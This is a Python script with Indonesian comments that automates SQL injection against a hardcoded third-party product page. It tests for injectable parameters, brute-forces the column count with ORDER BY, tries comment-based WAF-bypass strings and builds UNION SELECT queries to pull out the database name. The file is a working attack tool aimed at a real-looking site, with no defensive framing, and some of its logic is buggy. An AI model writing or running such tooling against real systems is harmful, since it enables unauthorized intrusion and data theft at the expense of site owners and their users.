import requests, re, sys, os
from bs4 import BeautifulSoup

def get_dbname(uni_sel, url_union, url_length_default):
     print("Mendapatkan nama databse")
     base, query = url_union.split("select ")
     columns = query.split(",")
     ss = uni_sel - 1
     print(ss)

     columns[ss] = "database()"

     new_query = ",".join(columns)
     new_url = base + "select " + new_query
     print(new_url)

     req_db = requests.get(new_url)
     res_order = req_db.text
     url_length_order = sum(len(i) for i in res_order)
     
     if url_length_order ==  url_length_default:
        print("Not found")
     else:
        word_list = ['_', 'db', 'database', 'library', 'web']
        
        soup = BeautifulSoup(res_order, "html.parser")
        for p in soup.find_all(["li", "p", "div"]):
            text = p.get_text(strip=True)

            if any(kw.lower() in text.lower() for kw in word_list):
                return text
                
def extract_numbers(text):
    return re.findall(r'\d+', text)

def get_number_vuln3(url, url_length_default, num, url_union):
     print("Mencari nomor pintu")
     num = []
     
     req_union = requests.get(url_union)
     res_order = req_union.text
     url_length_order = sum(len(i) for i in res_order)
     
     soup = BeautifulSoup(res_order, 'html.parser')
     p_tag = soup.find_all("li")

     for i, li in enumerate(p_tag, 1):
        numbers = extract_numbers(li.get_text())

        if numbers:
            num.append(numbers)
            uni_sel = int(num[0][0])
            print(f"Nomor pintu: {uni_sel}")
            get_db = get_dbname(uni_sel, url_union, url_length_default)
            return get_db
        else:
            pass
            
def get_number_vuln2(url, url_length_default, num, url_union):
     print("Mencari nomor pintu")
     num = []
     
     req_union = requests.get(url_union)
     res_order = req_union.text
     url_length_order = sum(len(i) for i in res_order)
     
     soup = BeautifulSoup(res_order, 'html.parser')
     p_tag = soup.find_all("div")

     for tag in p_tag:
        numbers = extract_numbers(tag.get_text())

        if numbers:
            num.append(numbers)
            uni_sel = int(num[0][0])
            print(f"Nomor pintu: {uni_sel}")
            get_db = get_dbname(uni_sel, url_union, url_length_default)
            return get_db
        else:
            print('NF')
            
def get_number_vuln(url, url_length_default, num, url_union):
     print("Mencari nomor pintu")
     num = []
     
     req_union = requests.get(url_union)
     res_order = req_union.text
     url_length_order = sum(len(i) for i in res_order)
     
     soup = BeautifulSoup(res_order, 'html.parser')
     p_tag = soup.find_all("p")

     for tag in p_tag:
        numbers = extract_numbers(tag.get_text())

        if numbers:
            num.append(numbers)
            uni_sel = int(num[0][0])
            print(f"Nomor pintu: {uni_sel}")
            get_db = get_dbname(uni_sel, url_union, url_length_default)
            return get_db
        else:
            return 'NF'

def union_select(d, url, url_length_default):
    url_union = url + ' union select ' + ','.join(str(n) for n in d) + ' -- -'
    req_union = requests.get(url_union)
    res_order = req_union.text
    url_length_order = sum(len(i) for i in res_order)
    print(url_union)
    print(url_length_default)
    print(url_length_order)
  
    if url_length_order ==  url_length_default:
        print('mencoba menambah tanda - pada URL')
        pre, id = url_union.split("id=")
        sep = f"-{id}"
        url_union = f"{pre}id={sep}"
        
        num_vuln = get_number_vuln(url, url_length_default, d, url_union)

        if num_vuln == 'NF':
             print("mencoba menambah tanda ' pada URL")
             new_url = re.sub(r"(id=-?\d+)", r"\1'", url_union)
             print(new_url)
             num_vuln = get_number_vuln3(url, url_length_default, d, new_url)
    elif url_length_order >= url_length_default:
        print('nilai url length dan url order hampir cocok')
        print('mencoba menambah tanda - pada URL')
        pre, id = url_union.split("id=")
        sep = f"-{id}"
        url_union = f"{pre}id={sep}"
        
        num_vuln = get_number_vuln(url, url_length_default, d, url_union)

        if num_vuln is None:
             print("mencoba menambah tanda ' pada URL")
             new_url = re.sub(r"(id=-?\d+)", r"\1'", url_union)
             num_vuln = get_number_vuln(url, url_length_default, d, new_url)

             if num_vuln is None:
                print('beda tag')
                num_vuln = get_number_vuln2(url, url_length_default, d, new_url)
                print(num_vuln)

    return num_vuln

def order_by4(s, url, url_length_default):
    num = []

    url_test = url + "'" + " order by " + str(s) + " -- -"
    req_order = requests.get(url_test)
    res_order = req_order.text
    url_length_error = sum(len(i) for i in res_order)
    print(url_length_error)
      
    for x in range(s+1, 100):
      url_order = url + "'" + " order by " + str(x) + " -- -"
      req_order = requests.get(url_order)
      res_order = req_order.text
      url_length_order = sum(len(i) for i in res_order)
      num.append(x)
      print(url_length_order)

      if url_length_order == url_length_error:
             pass
      else:
         print('Unkonown Clause in:' ,x)
         req_order.close()
         break

    return num

def order_by3(url, url_length_default):
    num = []

    for x in range(1, 100):
      url_order = url + "'" + " order by " + str(x) + " -- -"
      req_order = requests.get(url_order)
      res_order = req_order.text
      num.append(x)
      print(url_order)

      if "ERROR : Unknown column" in res_order:
           break
      else:
           pass

    return num[:-1]

def order_by2(url, url_length_default):
    num = []

    for x in range(1, 1000000):
      url_order = url + " order by " + str(x) + " -- -"
      req_order = requests.get(url_order)
      res_order = req_order.text
      url_length_order = sum(len(i) for i in res_order)
      num.append(x)

      if url_length_order == url_length_default:
         pass
      else:
         break

    return num[:-1]  

def order_by(url, url_length_default):
    num = []

    for x in range(1, 100):
      url_order = url + "'" + " order by " + str(x) + " -- -"
      req_order = s.get(url_order)
      res_order = req_order.text
      url_length_order = sum(len(i) for i in res_order)
      num.append(x)

      if url_length_order == url_length_default:
         if "ERROR : Unknown column" in res_order:
             print('Unkonown Clause in:' ,x-1)
             break
         else:
             pass
      else:
         print('Unkonown Clause in:' ,x-1)
         req_order.close()
         break

    return num
    
def check_isvulnwaf(url, url_length_default, url_vuln):
    list_waf = ["--/**/-", "--/*--*/-", "--/*&a=*/-", "--/*1337*/-", "--#qa%0A#%0A-", "--%23foo*%2F*bar%0D%0A-"]
    req_vuln_waf = requests.Session()
    
    for lw in list_waf:
        url_vuln_waf = url + lw + "'"
        print(url_vuln_waf)
        req_vuln_waf = req_vuln_waf.get(url_vuln_waf, verify=False)
        ch_vuln = req_vuln_waf.text
        url_length2 = sum(len(i) for i in ch_vuln)

        if url_length2 == url_length_default:
            return "Not Vuln"
        else:
            return "Vuln"
                
def check_isvuln(url, url_length_default):
 req_vuln = requests.Session()
 url_vuln = url + "'"
 
 req = req_vuln.get(url_vuln, verify=False)
 ch_vuln = req.text
 url_length2 = sum(len(i) for i in ch_vuln)
 
 
 if req.status_code == 403 and req.status_code == 415 and '403 Forbidden' in url_length2:
     print('WAF Blocking. Mencoba Bypass')
     req_vuln.close()
     chk = check_isvulnwaf(url, url_length_default, url_vuln)
     print(chk)
     return chk
 else:  
   if url_length2 == url_length_default:
     return 'url_nv'
     req_vuln.close()
   else:
     return 'url_vuln'
     req_vuln.close()

def break_ex():
    os.system('exit')
    
s = requests.Session()

url = "http://www.shouieco.com.tw/product.php?id=86"
req = s.get(url)
res_url = req.text
url_length_default = sum(len(i) for i in res_url)

print('Cek apakah vuln?')
is_vuln = check_isvuln(url, url_length_default)

if is_vuln == 'url_vuln':
    print('URL VULN')
    print('Mencoba order by')
    s = order_by(url, url_length_default)

    for x in s:
     if len(s) == 1:
        print("Gagal order by")
        print("Mencoba tanpa tanda kutip")
        d = order_by2(url, url_length_default)
        print(d)

        if not d:
          print('tidak menemukan error. mencoba metode lain.')
          print('Mencari error: unknown column.')
          f = order_by3(url, url_length_default)
          print(f"Unknown clause in: {f[-1]}")
          uni_sel = union_select(f, url, url_length_default)
          break
        else:
         for y in d:
          if len(d) == 1:
            print("Gagal")
            print("Mencoba menambahkan tanda minus(-)")
          else:
            print('Unkonown Clause in:' ,d[-1])
            print('Mencoba Union Select')
            uni_sel = union_select(d, url, url_length_default)
            print("Database:" ,uni_sel)
            break
     else:
            print('Mencoba Union Select')
            uni_sel = union_select(s, url, url_length_default)

            if uni_sel is None:
                 print('kemungkian union salah, mencoba order by ulang')
                 last_num = s[-1]
                 ob = order_by4(last_num, url, url_length_default)
                 k = s + ob
                 print(k)
                 uni_sel = union_select(k, url, url_length_default)
                 print("Database:" ,uni_sel)
                 break
                 
elif is_vuln == 'url_nv':
    print('Not vuln')
